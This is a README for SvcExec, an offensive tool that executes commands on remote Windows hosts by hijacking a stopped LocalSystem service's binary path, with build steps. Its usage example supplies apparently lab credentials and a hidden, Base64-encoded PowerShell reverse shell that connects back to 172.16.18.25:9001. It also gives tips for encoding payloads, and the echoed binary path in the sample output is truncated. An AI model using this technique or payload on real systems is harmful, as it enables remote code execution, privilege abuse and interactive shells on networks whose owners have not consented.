# SvcExec

[![svcexec.png](https://i.postimg.cc/HxGN8W67/svcexec.png)](https://postimg.cc/2qwGPYRz)

SvcExec will execute an arbitrary command on a remote Windows host. To achieve this, it temporarily overwrites the binary path of a stopped or disabled service running as LocalSystem. The service is then started to execute the command, and its original configuration is restored afterward.

## Usage

To run `svcexec.exe`, provide the necessary positional arguments:

```
C:\Windows\Tasks>svcexec.exe

Usage: svcexec.exe <username> <password> <rhost> [domain]
```

Upon launch, you'll be prompted to enter the command to execute on the target system. 

```
C:\Windows\Tasks>svcexec.exe htb-student HTB_@cademy_stdnt! 172.16.18.3 EAGLE

[*] Enter command to execute: powershell -ep bypass -nop -w hidden -enc JABpAHAAIAA9ACAAJwAxADcAMgAuADEANgAuADEAOAAuADIANQAnADsAJABwAG8AcgB0ACAAPQAgADkAMAAwADEAOwAkAHQAYwBwACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJABpAHAALAAgACQAcABvAHIAdAApADsAJABpAG8AIAA9ACAAJAB0AGMAcAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABpAG8ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAIAB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAJAAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAaQBvAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAgADAALAAgACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAaQBvAC4ARgBsAHUAcwBoACgAKQA7AH0AOwAkAHQAYwBwAC4AQwBsAG8AcwBlACgAKQA7AAoA
[*] Found eligible service: GraphicsPerfSvc
[*] Original BinaryPath: C:\Windows\System32\svchost.exe -k GraphicsPerfSvcGroup
[*] New BinaryPath: C:\Windows\System32\cmd.exe /D /C powershell -ep bypass -nop -w hidden -enc JABpAHAAIAA9ACAAJwAxADcAMgAuADEANgAuADEAOAAuADIANQAnADsAJABwAG8AcgB0ACAAPQAgADkAMAAwADEAOwAkAHQAYwBwACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJABpAHAALAAgACQAcABvAHIAdAApADsAJABpAG8AIAA9ACAAJAB0AGMAcAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABpAG8ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAIAB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQA
[*] Executed command
[*] Restored original service config
```

Avoid commands that open windows or graphical interfaces. If you need to chain multiple commands or use redirection operators, enclose the entire payload in double quotes. For PowerShell commands, use Base64 encoding with UTF-16LE to ensure the payload runs correctly.

## Build

### Visual Studio 2022

1. Open the `svcexec.sln` solution file in Visual Studio
2. Set the configuration to `Release` and the platform to `x64`
3. Go to `Build` → `Build Solution` to compile the executable

### Developer Command Prompt for VS 2022

```
msbuild svcexec.sln /m /p:Configuration=Release;Platform=x64
```




